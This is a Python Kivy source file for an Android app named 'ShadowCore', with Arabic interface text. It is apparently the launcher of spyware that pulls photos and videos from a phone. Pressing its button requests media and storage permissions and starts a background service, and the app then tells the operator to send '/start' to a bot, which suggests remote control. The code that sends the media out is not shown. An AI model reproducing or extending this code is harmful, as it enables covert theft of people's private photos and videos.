from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
from android.permissions import request_permissions, Permission

class ShadowCoreApp(App):
    def build(self):
        # تثبيت الشاشة بالطول
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ActivityInfo = autoclass('android.content.pm.ActivityInfo')
        activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT)

        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        self.status = Label(text="نظام سحب الصور والفيديو\nجاهز للتفعيل", font_size='18sp', halign='center')
        self.btn = Button(text="تفعيل الصلاحيات", background_color=(0.1, 0.7, 0.3, 1), font_size='20sp', bold=True)
        self.btn.bind(on_press=self.start_process)
        
        layout.add_widget(self.status)
        layout.add_widget(self.btn)
        return layout

    def start_process(self, instance):
        # طلب صلاحيات الصور والفيديو والملفات فقط (بدون صوتيات)
        perms = [
            Permission.READ_MEDIA_IMAGES,
            Permission.READ_MEDIA_VIDEO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.FOREGROUND_SERVICE
        ]
        request_permissions(perms, self.launch_service)

    def launch_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            self.status.text = "✅ تم التفعيل!\nأرسل /start للبوت الآن"
            self.btn.disabled = True
        except Exception as e:
            self.status.text = f"خطأ: {str(e)}"

if __name__ == '__main__':
    ShadowCoreApp().run()
